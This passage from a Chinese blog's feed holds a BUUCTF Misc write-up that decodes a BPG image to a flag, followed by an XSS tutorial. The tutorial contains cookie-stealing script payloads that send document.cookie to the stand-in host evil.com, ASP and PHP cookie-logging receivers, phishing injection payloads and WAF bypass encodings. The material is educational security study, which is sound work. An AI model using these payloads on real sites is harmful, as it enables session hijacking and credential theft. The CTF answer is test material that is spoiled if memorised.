-<p><strong>BPG (Better Portable Graphics)</strong> 是一个新的图片格式，目的是保证质量或者文件大小限制的情况下替换 JPEG 格式，主要特性：</p>
-<ul>
-<li>高压缩率</li>
-<li>支持大部分 Web 浏览器，带有一个小的 JavaScript 解码器 (gzipped size: 56 KB).</li>
-<li>基于 <a href="http://en.wikipedia.org/wiki/High_Efficiency_Video_Coding">HEVC</a> 开放视频压缩标准的子集</li>
-<li>支持跟 JPEG 的相同色度(grayscale, YCbCr 4:2:0, 4:2:2, 4:4:4) ，降低转换损失</li>
-<li>原生支持每通道 8 到 14 位，更好的动态范围</li>
-<li>支持无损压缩</li>
-<li>各种元数据</li>
-<li>支持动态</li>
-</ul>
-<p>正常windows没有办法识别BPG</p>
-<p>用工具：<a href="https://bellard.org/bpg/bpg-0.9.8-win64.zip">https://bellard.org/bpg/bpg-0.9.8-win64.zip</a></p>
-<p>命令：<code>.\bpgview.exe .\1.bpg</code></p>
-<p><img src="/2022/%E6%AF%8F%E6%97%A5Misc%E4%B8%80/image-20220323193906-tlc0e0a.png"></p>
-<p><code>YnNpZGVzX2RIbGhpe0JQR19pNV9iM3R0M3JfN2g0bl9KUEd9Cg==</code></p>
-<p><img src="/2022/%E6%AF%8F%E6%97%A5Misc%E4%B8%80/image-20220323194144-o0hlquy.png"></p>
-<p>bsides_dHlhi{BPG_i5_b3tt3r_7h4n_JPG}</p>
-]]></content>
-      <categories>
-        <category>BUUCTF(Misc)</category>
-      </categories>
-      <tags>
-        <tag>Misc</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>跨站脚本攻击XSS</title>
-    <url>/2022/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BBXSS/</url>
-    <content><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>跨站脚本攻击（Cross-site scripting，XSS）是一种安全漏洞，攻击者可以利用这种漏洞在网站上注入恶意的客户端代码。当被攻击者登陆网站时就会自动运行这些恶意代码，从而，攻击者可以突破网站的访问权限，冒充受害者。还可以对受害者采取Cookies资料窃取、会话劫持、钓鱼欺骗等各种攻击。</p>
-<span id="more"></span>
-
-<h1 id="XSS分类"><a href="#XSS分类" class="headerlink" title="XSS分类"></a>XSS分类</h1><h2 id="存储型-XSS（持久型）"><a href="#存储型-XSS（持久型）" class="headerlink" title="存储型 XSS（持久型）"></a><strong>存储型 XSS（持久型）</strong></h2><hr>
-<p>注入型脚本永久存储在目标服务器上。当浏览器请求数据时，脚本从服务器上传回并执行。</p>
-<p>这类 XSS 不需要用户点击特定 URL 就能执行跨站脚本，攻击者早就上传恶意代码或储存到漏洞服务器中，只要受害者浏览包含此恶意代码的页面就会执行恶意代码。持久型 XSS 一般出现在网站留言、评论、博客日志等交互处，恶意脚本存储到客户端或者服务端的数据库中。</p>
-<p><img src="/2022/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BBXSS/image-20220316233332570.png"></p>
-<h2 id="反射型-XSS（非持久型）"><a href="#反射型-XSS（非持久型）" class="headerlink" title="反射型 XSS（非持久型）"></a><strong>反射型 XSS（非持久型）</strong></h2><hr>
-<p>攻击者将恶意代码附加到URL参数中，当用户点击一个恶意链接，或者提交一个表单，或者进入一个恶意网站时，注入脚本进入被攻击者的网站。Web服务器将注入脚本，比如一个错误信息，搜索结果等 返回到用户的浏览器上。由于浏览器认为这个响应来自”可信任”的服务器，所以会执行这段脚本。通常出现在网站的搜索栏、用户登录口等地方，常用来窃取客户端 Cookies 或进行钓鱼欺骗。</p>
-<p><img src="/2022/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BBXSS/image-20220316233924916.png"></p>
-<h2 id="基于-DOM-的-XSS"><a href="#基于-DOM-的-XSS" class="headerlink" title="基于 DOM 的 XSS"></a><strong>基于 DOM 的 XSS</strong></h2><hr>
-<p> DOM-Based XSS 是基于 DOM 文档对象模型的一种漏洞。通过修改原始的客户端代码，受害者浏览器的 DOM 环境改变，导致有效载荷的执行。也就是说，页面本身并没有变化，但由于DOM环境被恶意修改，有客户端代码被包含进了页面，并且意外执行。</p>
-<h1 id="XSS利用"><a href="#XSS利用" class="headerlink" title="XSS利用"></a>XSS利用</h1><hr>
-<h2 id="Cookies利用"><a href="#Cookies利用" class="headerlink" title="Cookies利用"></a>Cookies利用</h2><hr>
-<p>攻击者使用使用代码获取客户端的Cookies信息：</p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">location</span>=<span class="string">&quot;http://www.evil.com/cookie.asp?cookie=&quot;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Image</span>().<span class="property">src</span>=<span class="string">&quot;http://www.evil.com/cookie.asp?cookie=&quot;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span></span><br><span class="line">&lt;/script&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://www.evil.com/cookie.asp?cookie=&quot;</span>+<span class="attr">document.cookie</span>&gt;</span><span class="tag">&lt;/<span class="name">img</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
-
-<p>在攻击者远程服务器上，有一个接受和记录Cookies信息的文件，</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">  msg=Request.ServerVariables(&quot;QUERY_STRING&quot;)</span><br><span class="line">  testfile=Server.MapPath(&quot;cookie.txt&quot;)</span><br><span class="line">  set fs=server.CreateObject(&quot;Scripting.filesystemobject&quot;)</span><br><span class="line">  set thisfile=fs.OpenTextFile(testfile,8,True,0)</span><br><span class="line">  thisfile.Writeline(&quot;&quot;&amp;msg&amp; &quot;&quot;)</span><br><span class="line">  thisfile.close</span><br><span class="line">  set fs=nothing</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cookie</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cookie&#x27;</span>];</span><br><span class="line"><span class="variable">$log</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;cookie.txt&quot;</span>, <span class="string">&quot;a&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$log</span>, <span class="variable">$cookie</span> . <span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$log</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>攻击者在获取到Cookies之后，通过修改访问浏览器的Cookies，以达到伪造用户登录。</p>
-<h2 id="会话劫持"><a href="#会话劫持" class="headerlink" title="会话劫持"></a>会话劫持</h2><hr>
-<p>由于使用 Cookies 存在一定的安全缺陷，因此，开发者开始使用一些更为安全的认证方式，如 Session。在 Session 机制中，客户端和服务端通过标识符来识别用户身份和维持会话，但这个标识符也有被其他人利用的可能。会话劫持的本质是在攻击中带上了 Cookies 并发送到了服务端。</p>
-<p>如某 CMS 的留言系统存在一个存储型 XSS 漏洞，攻击者把 XSS 代码写进留言信息中，当管理员登录后台并查看是，便会触发 XSS 漏洞，由于 XSS 是在后台触发的，所以攻击的对象是管理员，通过注入 JavaScript 代码，攻击者便可以劫持管理员会话执行某些操作，从而达到提升权限的目的。</p>
-<p>比如，攻击者想利用 XSS 添加一个管理员账号，只需要通过之前的代码审计或其他方式，截取到添加管理员账号时的 HTTP 请求信息，然后使用 XML HTTP 对象在后台发送一个 HTTP 请求即可，由于请求带上了被攻击者的 Cookies，并一同发送到服务端，即可实现添加一个管理员账户的操作。</p>
-<h2 id="钓鱼"><a href="#钓鱼" class="headerlink" title="钓鱼"></a>钓鱼</h2><hr>
-<ul>
-<li><strong>重定向钓鱼</strong></li>
-</ul>
-<p>将当前访问重定向到一个钓鱼网页</p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="attr">http</span>:<span class="comment">//www.bug.com/index.php?search=&quot;&#x27;&gt;&lt;script&gt;document.location.href=&quot;http://www.evil.com&quot;&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><strong>HTML注入式钓鱼</strong></li>
-</ul>
-<p>利用XSS漏洞注入HTML或JavaScript代码到页面中</p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="attr">http</span>:<span class="comment">//www.bug.com/index.php?search=&quot;&#x27;&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;login&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;div style=&quot;text-align:center;&quot;&gt;&lt;form Method=&quot;POST&quot; Action=&quot;phishing.php&quot; Name=&quot;form&quot;&gt;&lt;br /&gt;&lt;br /&gt;Login:&lt;br/&gt;&lt;input name=&quot;login&quot; /&gt;&lt;br /&gt;Password:&lt;br/&gt;&lt;input name=&quot;Password&quot; type=&quot;password&quot; /&gt;&lt;br/&gt;&lt;br/&gt;&lt;input name=&quot;Valid&quot; value=&quot;Ok&quot; type=&quot;submit&quot; /&gt;&lt;br/&gt;&lt;/form&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;</span></span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><strong>iframe钓鱼</strong></li>
-</ul>
-<p>通过<code>&lt;iframe&gt;</code>标签嵌入远程域的一个页面实施钓鱼</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.bug.com/index.php?search=&#x27;&gt;&lt;iframe src=&quot;http://www.evil.com&quot; height=&quot;100%&quot; width=&quot;100%&quot;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><strong>Flash钓鱼</strong></li>
-</ul>
-<p>将构造好的 <strong>Flash</strong> 文件传入服务器，在目标网站用 <code>&lt;object&gt;</code> 或 <code>&lt;embed&gt;</code> 标签引用即可。</p>
-<ul>
-<li><p>高级钓鱼技术</p>
-<p>注入代码劫持 HTML 表单、使用 JavaScript 编写键盘记录器等。</p>
-</li>
-</ul>
-<h2 id="网页上马"><a href="#网页上马" class="headerlink" title="网页上马"></a>网页上马</h2><hr>
-<p>通过篡改网页的方式，如在 <strong>XSS</strong> 中使用 <code>&lt;iframe&gt;</code> 标签。</p>
-<h2 id="DOS与DDOS"><a href="#DOS与DDOS" class="headerlink" title="DOS与DDOS"></a>DOS与DDOS</h2><hr>
-<p>通过注入恶意<strong>Javascript</strong>代码，导致拒绝服务攻击</p>
-<h2 id="XSS-蠕虫"><a href="#XSS-蠕虫" class="headerlink" title="XSS 蠕虫"></a>XSS 蠕虫</h2><hr>
-<p>通过精心构造的 <strong>XSS</strong> 代码，可以实现非法转账、篡改信息、删除文章、自我复制等诸多功能。</p>
-<h1 id="XSS绕过WAF"><a href="#XSS绕过WAF" class="headerlink" title="XSS绕过WAF"></a>XSS绕过WAF</h1><h2 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h2><ul>
-<li><strong>HTML实体编码</strong></li>
-</ul>
-<p>命名规则：以&amp;开头，分号结尾。&lt; &#x3D; <code>&amp;1t</code></p>
-<p>字符编码</p>
-<p>十进制，十六进制的ASCII码或者Unicode字符编码。如<code>&amp;#数值</code>;</p>
-<p>如 &lt; 的编码为：<code>&amp;#60</code>、<code>&amp;#x003c</code></p>
-<ul>
-<li><strong>URL编码</strong></li>
-</ul>
-<p>两次URL全编码</p>
-<ul>
-<li><strong><code>String.fromCharCode</code>编码</strong></li>
-</ul>
-<p>alert的编码为<code>String.fromCharCode</code>(97,108,101,114,116)</p>
-<p>XSS绕过也可以看看该文章：<a href="https://blog.csdn.net/weixin_50464560/article/details/114491500">XSS过滤绕过速查表</a></p>
-<hr>
-<p><strong>先记录到这里，以后有补充还会更新的</strong></p>
-]]></content>
-      <categories>
-        <category>web渗透</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
       </tags>
   </entry>
 </search>
